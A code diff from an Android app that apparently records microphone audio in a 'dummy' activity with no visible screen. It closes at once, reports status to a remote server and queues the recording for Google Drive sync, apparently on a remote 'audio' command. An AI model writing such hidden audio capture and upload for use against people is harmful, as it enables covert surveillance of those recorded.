@@ -8,7 +8,9 @@ import android.os.Bundle
 import android.view.WindowManager
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
-import com.neubofy.veto.utils.GoogleDriveUploader
+import com.neubofy.veto.transports.NextJsServerTransport
+import com.neubofy.veto.utils.MediaStorageManager
+import com.neubofy.veto.utils.MediaSyncManager
 import com.neubofy.veto.utils.log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -66,9 +68,9 @@ class DummyAudioActivity : AppCompatActivity() {
         hasStarted = true
 
         val ctx = applicationContext
-        val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")
+        val audioDir = MediaStorageManager.getAudioDir(ctx)
+        val outputFile = File(audioDir, "audio_${System.currentTimeMillis()}.m4a")
 
-        // Use applicationContext-scoped coroutine so recording survives even if Activity is destroyed
         appScope.launch {
             val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                 MediaRecorder(ctx)
@@ -92,31 +94,25 @@ class DummyAudioActivity : AppCompatActivity() {
                 recorder.stop()
                 recorder.release()
 
-                // Finish the activity immediately — upload happens fully in background
+                // Send Step 2 status message
+                val transport = NextJsServerTransport(ctx)
+                transport.send(
+                    ctx,
+                    "Audio captured successfully! Saved locally to ${outputFile.name}. Queued for Google Drive upload...",
+                    "audio"
+                )
+
+                // Finish activity immediately
                 runOnUiThread { finish() }
 
-                GoogleDriveUploader.uploadFile(
-                    context = ctx,
-                    file = outputFile,
-                    mimeType = "audio/mp4",
-                    type = "audio",
-                    onSuccess = { link ->
-                        outputFile.delete()
-                        val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
-                        transport.send(ctx, "Audio Captured: $link", "audio")
-                    },
-                    onError = { error ->
-                        outputFile.delete()
-                        val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
-                        transport.send(ctx, "Failed to upload audio: $error", "audio")
-                    }
-                )
+                // Trigger smart syncer for recent files (< 1 min)
+                MediaSyncManager.syncRecentMedia(ctx, maxAgeMillis = 60_000L, commandName = "audio")
+
             } catch (e: Exception) {
                 ctx.log().e(TAG, "Audio recording failed: ${e.message}")
-                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
+                val transport = NextJsServerTransport(ctx)
                 transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
                 try { recorder.release() } catch (_: Exception) {}
-                outputFile.delete()
                 runOnUiThread { finish() }
             }
         }
